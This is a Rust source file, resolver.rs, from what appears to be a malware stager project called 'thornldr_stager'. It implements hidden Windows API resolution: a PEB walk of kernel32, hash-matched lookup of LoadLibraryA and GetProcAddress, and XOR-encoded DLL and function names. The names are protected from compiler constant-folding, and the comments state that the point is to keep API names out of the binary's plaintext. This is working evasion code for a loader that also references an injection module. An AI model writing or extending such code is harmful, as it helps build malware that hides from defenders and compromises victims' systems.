// resolver.rs — unified dynamic API resolution for thornldr_stager.
//
// Two layers:
//
//  1. Bootstrap. On first use we PEB-walk kernel32 and hash-resolve
//     LoadLibraryA / GetProcAddress. Their pointers are cached in static
//     atomics so subsequent calls are a load + transmute.
//
//  2. Per-function lazy slots. Every Win32 function we call lives in a
//     module-level `ResolverSlot` (a small struct containing the XOR-encoded
//     DLL name, the XOR-encoded function name, and an `AtomicPtr` cache).
//     The first call XOR-decodes the names into stack buffers, calls
//     LoadLibraryA / GetProcAddress via the bootstrap pointers, and stores
//     the resolved address. Subsequent calls hit the cached pointer.
//
// No function name or DLL name ever appears in plaintext in the binary —
// the only two strings the export-table walker matches are the DJB2 hashes
// of "LoadLibraryA" and "GetProcAddress".

use core::ffi::c_void;
use core::sync::atomic::{AtomicPtr, Ordering};

use crate::api_hash::{
    get_proc_by_hash, FnGetProcAddress, FnLoadLibraryA,
    HASH_GET_PROC_ADDRESS, HASH_LOAD_LIBRARY_A,
};
use crate::peb_walk::find_kernel32;

// ── XOR-encoded string helper (KEY = 0x5A — same as dynamic_inject) ─────────
pub const RKEY: u8 = 0x5A;

/// Compile-time XOR over a byte array. Used to bake encoded API name
/// constants at each call site without hand-writing hex arrays:
///
///     const ENC_CREATE_FILE_W: [u8; 11] = xor_const(*b"CreateFileW");
///
/// Because the result is a `const` value placed in `.rdata`, we wrap reads
/// of it with `core::hint::black_box` in `decode_into` to stop LTO from
/// folding (k ^ RKEY) ^ RKEY back to the plaintext literal.
pub const fn xor_const<const N: usize>(src: [u8; N]) -> [u8; N] {
    let mut out = [0u8; N];
    let mut i = 0;
    while i < N {
        out[i] = src[i] ^ RKEY;
        i += 1;
    }
    out
}

/// XOR-decode `enc` into `out` and null-terminate. Returns `out` as a
/// C-string pointer. `out` must have capacity for `enc.len() + 1` bytes.
#[inline(never)]
pub unsafe fn decode_into(enc: &[u8], out: &mut [u8]) -> *const u8 {
    let n = enc.len();
    let mut i = 0;
    while i < n {
        // black_box both the encoded byte and the key so LTO can't const-fold
        // the double-XOR back to the plaintext literal.
        let e = core::hint::black_box(enc[i]);
        let k = core::hint::black_box(RKEY);
        out[i] = e ^ k;
        i += 1;
    }
    out[n] = 0;
    out.as_ptr()
}

// ── Bootstrap cache ─────────────────────────────────────────────────────────
static LOAD_LIBRARY_A:   AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static GET_PROC_ADDRESS: AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());

pub unsafe fn bootstrap() -> Option<(FnLoadLibraryA, FnGetProcAddress)> {
    let cached_ll = LOAD_LIBRARY_A.load(Ordering::Acquire);
    let cached_gp = GET_PROC_ADDRESS.load(Ordering::Acquire);
    if !cached_ll.is_null() && !cached_gp.is_null() {
        return Some((
            core::mem::transmute::<*mut c_void, FnLoadLibraryA>(cached_ll),
            core::mem::transmute::<*mut c_void, FnGetProcAddress>(cached_gp),
        ));
    }
    let k32 = find_kernel32();
    if k32.is_null() { return None; }
    let ll = get_proc_by_hash(k32, HASH_LOAD_LIBRARY_A);
    let gp = get_proc_by_hash(k32, HASH_GET_PROC_ADDRESS);
    if ll.is_null() || gp.is_null() { return None; }
    LOAD_LIBRARY_A.store(ll as *mut c_void, Ordering::Release);
    GET_PROC_ADDRESS.store(gp as *mut c_void, Ordering::Release);
    Some((
        core::mem::transmute::<*mut u8, FnLoadLibraryA>(ll),
        core::mem::transmute::<*mut u8, FnGetProcAddress>(gp),
    ))
}

// ── Generic resolver ────────────────────────────────────────────────────────
// Decode DLL + function name from XOR-obfuscated slices, LoadLibraryA the DLL,
// GetProcAddress the function. Callers transmute the raw pointer to their
// function type. We keep all decoded names on the stack; neither the
// encoded nor decoded strings are stored in .rdata as plaintext.
//
// `resolve_cached` walks a module-level AtomicPtr cache: the first call
// actually resolves, later calls short-circuit to the cached pointer.

pub unsafe fn resolve(dll_enc: &[u8], name_enc: &[u8]) -> *mut u8 {
    let (ll, gp) = match bootstrap() { Some(p) => p, None => return core::ptr::null_mut() };
    let mut dll_buf:  [u8; 32] = [0; 32];
    let mut name_buf: [u8; 64] = [0; 64];
    if dll_enc.len()  >= dll_buf.len()  { return core::ptr::null_mut(); }
    if name_enc.len() >= name_buf.len() { return core::ptr::null_mut(); }
    let dll_ptr  = decode_into(dll_enc,  &mut dll_buf);
    let name_ptr = decode_into(name_enc, &mut name_buf);
    let hmod = ll(dll_ptr);
    if hmod.is_null() { return core::ptr::null_mut(); }
    gp(hmod, name_ptr)
}

pub unsafe fn resolve_cached(
    cache: &AtomicPtr<c_void>,
    dll_enc: &[u8],
    name_enc: &[u8],
) -> *mut u8 {
    let cur = cache.load(Ordering::Acquire);
    if !cur.is_null() {
        return cur as *mut u8;
    }
    let p = resolve(dll_enc, name_enc);
    if !p.is_null() {
        cache.store(p as *mut c_void, Ordering::Release);
    }
    p
}

// ── Encoded DLL names (KEY = 0x5A) ──────────────────────────────────────────
pub const ENC_KERNEL32: [u8; 12] = xor_const(*b"kernel32.dll");
pub const ENC_NTDLL:    [u8;  9] = xor_const(*b"ntdll.dll");
